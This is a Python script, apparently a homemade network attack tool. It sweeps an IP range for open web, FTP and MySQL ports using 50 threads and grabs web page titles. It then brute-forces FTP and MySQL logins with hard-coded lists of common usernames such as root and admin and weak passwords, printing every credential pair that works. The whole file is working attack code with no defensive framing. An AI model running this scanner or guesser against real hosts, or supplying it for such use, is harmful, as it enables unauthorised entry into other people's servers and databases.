import socket
#import threading
import IPy
import time
from queue import Queue
from threading import Thread
import requests
import re
import optparse
parse = optparse.OptionParser('usage %prog -p(--ip) <IP地址/子网掩码（24）>')
parse.add_option('-p','--ip',dest='ips',help='请输入正确格式:0.0.0.0/0',type=str,action='store',default='192.168.58.133/32')
(options,args) = parse.parse_args()
Queue_ip= options.ips

def queue1(qu_ip):
    ip_port_queue=Queue(-1)
    port=[80,21,3306]
    access=[]
    for ip_list in IPy.IP(qu_ip,make_net=1) :
        for port_list in port:
            ip_port_queue.put((str(ip_list),port_list))
    return ip_port_queue

def sm(i,ip_port_list):
    socket.setdefaulttimeout(1)
    while not list_queue.empty():
        s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        addres = list_queue.get()
        try:
            s.connect(addres)
            print('[+] {} {}'.format(addres[0],addres[1]))
            if str(addres[1])=='80':
                web_list.append((addres[0],addres[1]))
                web()
            elif str(addres[1]) == '3306':
                mysql_list.append((addres[0],addres[1]))
                mysql()
            elif str(addres[1]) == '21':
                ftp_list.append((addres[0],addres[1]))
                ftp()
        except Exception as e:
            s.close()
            print('[-] {} {}'.format(addres[0],addres[1]))
        s.close()

def nwsm1():
    if __name__ == "__main__":
        ip_port_list=queue1
        threads = []
        threads_num=50
        for i in range(threads_num):
            t = Thread(target=sm,args=((i,list_queue))) 
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    print('[+]完成')

def web():
    for i in range(0,len(web_list)):
        url='http://{}:{}'.format(web_list[i][0],web_list[i][1])
        req=requests.get(url)
        title = re.findall(r'<title>(.*)</title>',req.text)
        list_web_get.append(title) 
def list_web_title():
    for i in range(0,len(list_web_get)):
         print('title:{}'.format(list_web_get[i]))




def ftp():
    import ftplib
    for i in range(0,len(ftp_list)):
            host='{}'.format(ftp_list[i][0])
            for i in user_list:
                for j in passwd_list:
                    try:
                        ftp = ftplib.FTP(host)
                        ftp.login(i,j)
                        ftp_user_passwd.append((i,j))
                        ftp.quit()
                    except:
                        pass

def list_ftp_user_passwd():
    for i in range(0,len(ftp_user_passwd)):
        print('[ftp]user:{}  passwd:{}'.format(ftp_user_passwd[i][0],ftp_user_passwd[i][1]))

def mysql():
    import pymysql
    for i in range(0,len(mysql_list)):
        for j in range(0,len(mysql_list)):
            host=mysql_list[i][0]
            port=mysql_list[j][1]
            for i in user_list:
                for j in passwd_list:
                    try:
                        conn=pymysql.connect(host=host,port=port,user=i,passwd=j)
                        mysql_user_passwd.append((i,j))
                    except:
                        pass
def list_mysql_user_passwd():
    for i in range(0,len(mysql_user_passwd)):
        print('[mysql]user:{}  passwd:{}'.format(mysql_user_passwd[i][0],mysql_user_passwd[i][1]))

web_list=[]
ftp_list=[]
mysql_list=[]
list_web_get=[]
ftp_user_passwd=[]
mysql_user_passwd=[]
user_list=['admin','root','user','user1','Administrator']
passwd_list=['123','root','abc','good']
queue1(Queue_ip)
list_queue=queue1(Queue_ip)



nwsm1()

list_web_title()
list_ftp_user_passwd()
list_mysql_user_passwd()
